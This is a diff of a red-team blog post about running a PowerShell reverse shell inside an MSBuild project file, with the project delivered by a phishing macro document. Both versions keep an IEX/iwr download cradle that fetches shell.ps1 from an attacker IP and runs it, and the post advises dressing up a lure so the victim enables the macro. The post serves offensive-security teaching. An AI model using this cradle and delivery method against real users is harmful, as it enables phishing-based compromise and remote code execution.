@@ -23,13 +23,13 @@ We can pass a ".csproj" (Visual Studio .NET C# Project file) to MSBuild and have
 
 <script src="https://gist.github.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0.js"></script>
 
-We will use this runspace to download and execute our reverse shell using a PowerShell 3.0+ download cradle:
+Within this we execute our PowerShell 3.0+ download cradle:
 
-```pipeline.Commands.AddScript("IEX (iwr 'http://10.10.10.10/shell.ps1')");```
+`pipeline.Commands.AddScript("IEX (iwr 'http://10.10.10.10/shell.ps1')");`
 
 <script src="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3.js"></script>
 
-Good. But now we need a means of delivering the project file and executing MSBuild. The macro below will download the csproj file to disk In order for the user to execute the macro the document needs to be dressed appropriately. (John Lambert...)
+Good. But now we need a means of delivering the project file and executing MSBuild. The macro below will download the csproj file to disk In order for the user to execute the macro the document needs to be dressed appropriately. John Lambert regularly shares interesting phishing lures and payloads, and we... 
 
 https://pbs.twimg.com/media/DWHHdvJV4AAvl22.jpg
 
